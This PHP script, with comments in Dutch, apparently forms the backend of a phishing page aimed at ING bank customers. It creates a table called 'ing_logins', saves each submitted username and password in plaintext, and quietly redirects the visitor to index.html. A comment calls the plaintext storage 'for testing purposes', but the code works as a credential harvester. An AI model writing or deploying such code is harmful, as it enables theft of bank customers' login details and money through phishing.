<?php
// Verbind met de SQLite-database (bestand data.db in dezelfde map)
try {
    $db = new PDO('sqlite:' . __DIR__ . '/data.db');
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (Exception $e) {
    die('Databaseverbinding mislukt: ' . $e->getMessage());
}

// Maak de tabel voor ING-logins als deze nog niet bestaat
$db->exec("CREATE TABLE IF NOT EXISTS ing_logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

// Verkrijg de POST-gegevens
$username = isset($_POST['username']) ? trim($_POST['username']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';

// Eenvoudige validatie: als een veld leeg is, geef een foutmelding
if ($username === '' || $password === '') {
    die('Alle velden moeten ingevuld zijn.');
}

// Sla de gegevens op (let op: voor testdoeleinden als plaintext)
$stmt = $db->prepare("INSERT INTO ing_logins (username, password) VALUES (:username, :password)");
$stmt->bindParam(':username', $username);
$stmt->bindParam(':password', $password);
$stmt->execute();

// Na opslaan: doorsturen naar index.html
header("Location: index.html");
exit;
?>
